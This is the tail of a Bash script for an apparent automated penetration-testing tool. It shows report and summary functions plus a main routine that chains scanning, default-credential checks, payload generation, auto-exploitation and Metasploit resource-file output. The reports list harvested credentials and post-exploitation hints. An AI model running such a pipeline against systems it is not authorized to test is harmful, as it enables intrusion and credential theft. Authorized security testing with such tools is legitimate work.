        echo "  Mode       : $SCAN_MODE"
        echo "  LHOST      : ${LHOST:-not set}"
        echo ""
        echo "  SUMMARY"
        echo "  ─────────────────────────────"
        echo "  Critical : $CRITICAL_COUNT"
        echo "  High     : $HIGH_COUNT"
        echo "  Medium   : $MEDIUM_COUNT"
        echo "  Low      : $LOW_COUNT"
        echo "  Total    : $TOTAL_VULNS"
        echo ""
        if [[ ${#CONFIRMED_VULNS[@]} -gt 0 ]]; then
            echo "  CONFIRMED EXPLOITABLE"
            echo "  ─────────────────────────────"
            for cv in "${CONFIRMED_VULNS[@]}"; do echo "  $cv"; done
            echo ""
        fi
        echo "════════════════════════════════════════════════════════════"
        echo ""

        for ip in "${!ATTACK_MAP[@]}"; do
            echo "TARGET: $ip"
            [[ -n "${OS_MAP[$ip]:-}" ]]       && echo "  OS        : ${OS_MAP[$ip]}"
            [[ -n "${HOSTNAME_MAP[$ip]:-}" ]] && echo "  Hostname  : ${HOSTNAME_MAP[$ip]}"
            [[ -n "${OPEN_PORTS_MAP[$ip]:-}" ]] && echo "  Ports     : ${OPEN_PORTS_MAP[$ip]}"

            local hcves=""
            for key in "${!CVE_MAP[@]}"; do [[ "$key" == "$ip:"* ]] && hcves+=" ${CVE_MAP[$key]}"; done
            [[ -n "$hcves" ]] && echo "  CVEs      :$hcves"

            local hcreds=""
            for key in "${!CRED_MAP[@]}"; do [[ "$key" == "$ip:"* ]] && hcreds+=" ${key##*:}=${CRED_MAP[$key]}"; done
            [[ -n "$hcreds" ]] && echo "  Creds     :$hcreds"
            echo ""

            echo "${ATTACK_MAP[$ip]}" | sed 's/\x1b\[[0-9;]*m//g'

            if [[ -n "${POSTEXPLOIT_MAP[$ip]:-}" ]]; then
                echo "  POST-EXPLOITATION HINTS:"
                echo "${POSTEXPLOIT_MAP[$ip]}" | sed "s/LHOST/${LHOST:-LHOST}/g; s/LPORT/$LPORT/g"
            fi
            echo "────────────────────────────────────────────────────────────"
            echo ""
        done
    } > "$report_file"
    log OK "Text report: $report_file"
}

################################################################################
# FINAL SUMMARY
################################################################################
print_summary() {
    log STEP "Scan Complete"
    echo ""
    echo -e "  ${BOLD}${WHITE}Vulnerability Summary${RESET}"
    echo -e "  ${RED}Critical  : $CRITICAL_COUNT${RESET}"
    echo -e "  ${YELLOW}High      : $HIGH_COUNT${RESET}"
    echo -e "  ${YELLOW}Medium    : $MEDIUM_COUNT${RESET}"
    echo -e "  ${GREEN}Low       : $LOW_COUNT${RESET}"
    echo -e "  Total     : $TOTAL_VULNS"
    echo ""
    echo -e "  ${BOLD}Hosts scanned       : $HOSTS_SCANNED${RESET}"
    echo -e "  ${BOLD}Hosts with surface  : ${#ATTACK_MAP[@]}${RESET}"
    if [[ ${#CONFIRMED_VULNS[@]} -gt 0 ]]; then
        echo ""
        echo -e "  ${LRED}${BOLD}CONFIRMED EXPLOITABLE:${RESET}"
        for cv in "${CONFIRMED_VULNS[@]}"; do echo -e "    ${RED}★ $cv${RESET}"; done
    fi
    echo ""
    echo -e "  ${CYAN}Output files:${RESET}"
    echo -e "    Log         : $LOG_FILE"
    echo -e "    nmap XML    : $XML_OUT"
    echo -e "    Text report : $OUTDIR/attack_suggestions.txt"
    [[ $GENERATE_HTML -eq 1 ]]   && echo -e "    HTML report : $OUTDIR/report.html"
    [[ $GENERATE_JSON -eq 1 ]]   && echo -e "    JSON report : $OUTDIR/report.json"
    [[ $GENERATE_MSF_RC -eq 1 ]] && echo -e "    MSF RC files: $OUTDIR/msf_rc/"
    echo -e "    Payloads    : $OUTDIR/payloads/"
    echo -e "    Recon       : $OUTDIR/recon/"
    echo -e "    Loot        : $OUTDIR/loot/"
    echo -e "    SSL audits  : $OUTDIR/ssl/"
    echo -e "    Web scans   : $OUTDIR/web/"
    echo ""
    [[ $CRITICAL_COUNT -gt 0 ]] && \
        log CRIT "CRITICAL vulnerabilities found — review report immediately."
}

################################################################################
# MAIN
################################################################################
main() {
    banner
    parse_args "$@"
    check_deps
    setup_output
    print_config

    load_targets
    phase_host_discovery
    phase_port_scan
    phase_banner_grab
    phase_passive_recon
    phase_web_fingerprint
    phase_ssl_audit
    phase_smb_deep
    phase_default_creds
    parse_nmap_xml

    if [[ ${#ATTACK_MAP[@]} -eq 0 ]]; then
        log WARN "No exploitable services found on any host."
        exit 0
    fi

    phase_generate_payloads
    phase_auto_exploit
    generate_msf_rc
    generate_text_report
    generate_json_report
    generate_html_report
    print_summary
}

main "$@"
